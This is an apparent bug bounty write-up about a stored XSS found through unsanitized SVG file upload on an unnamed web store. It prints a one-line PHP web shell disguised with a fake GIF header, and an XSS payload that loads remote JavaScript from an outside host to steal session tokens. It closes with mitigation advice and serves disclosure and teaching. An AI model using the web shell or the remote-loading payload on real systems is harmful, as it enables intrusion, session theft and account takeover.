# Stored XSS via Unsanitized SVG File Upload

- **Source URL:** https://medium.com/@youssefawad1357/stored-xss-via-unsanitized-svg-file-upload-d7e4619cc937?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@youssefawad1357
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 10580)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hello Bug Hunters Community,

New Write-up, New Gains ✪♕

In the last write-up, I mentioned that I had shifted my focus to hunt for external programs for this period, and I have started on a program, let’s call it **“pharaoh.com”**.

So let’s deep dive into the technical details

### **Brief on the Bug**

The application allows authenticated users to upload SVG files without sanitizing their content, enabling an attacker to embed malicious JavaScript🙃.

#### **My Methodology in testing the application**

1- Mapping the application into smaller functionalities like this:

2- Then try to visit any link or click on any button on every page to understand how the application responds to every request:

3- Then apply all my knowledge with all the bugs I know on these sources.

### Reproducing the Bug

- While visiting the **“ Products ”** tab, I have found that I can upload a file to the store. I will make the logo of the store.

- So then I have tried to upload my initial file to test the file upload functionality

**→ File Name:** shell.jpg

**→ File Content:**

GIF89

\<?php system($\_GET\['cmd'\]) ; phpinfo();?>

**Don’t worry, a Simple Explanation is here:**

**→ GIF89:**

The file header is in ASCII format, but a fake one, because I want to deceive the server into thinking that this file is a normal image file, not a PHP one.

**→\`\`\` \<?php system($\_GET\[‘cmd’\]); phpinfo(); ?> \`\`\`:**

Simple PHP code trying to run a system command through a get parameter called **“ cmd ”**

**Request In Burp:**

The File has been uploaded successfully, but unfortunately, I can’t run any OS commands because of many Reasons:

1- **The server might treat the File as Static, Not Executable.**

2- **No Server-Side Execution.**

3- **The Directory that the files are uploaded to is not executable.**

So, I switched my thinking to exploiting a stored XSS by uploading an SVG file, which will have a more critical impact.

So I have made this request:

**I said Don’t worry, a brief explanation:**

- Changing the **file extension** from **(JPG → SVG)**
- Changing the **Content-type** from **(image/png → text/javascript)**
- Injecting an **XSS payload** via an **SVG file**.

→ The server responds with **201 Created**

So Now I able to upload an SVG file with storing an XSS payload in it .

**But I want to increase the severity that leads to Account Takeover(ATO**)🤫

So I visited **https://bxsshunter.com/bxss-hunter** and get this payload

`<script>$.getScript("//egb.bxss.in")</script>`
- This payload loads and executes a remote JavaScript hosted on the domain egb.bxss.in (a subdomain of bxss.in).
- so now I can bypass inline script filters or sanitizations the app might have.

- **Token/cookie theft is a major step toward account takeover.**

### **Impact:**

\- Attackers can execute arbitrary JavaScript in users’ browsers, leading to session theft, impersonation, phishing, or UI manipulation.

### **Mitigations:**

- Developers must sanitize all uploaded SVG files to remove scripts and event attributes.
- Restrict uploads to safe image types (PNG, JPEG) where possible.
- Serve uploaded files from segregated domains with strict Content Security Policies.
- Apply access controls or token-based restrictions on CDN URLs for sensitive uploads.

Follow the upcoming write-ups, which contain great and useful information for you.

#### **Social media accounts:**

#bugbounty #Cyber\_security #bughunting #bugbounty #bugbountytips #redteam #redteaming #ethicalhacking #rednexus #redteam #redteaming
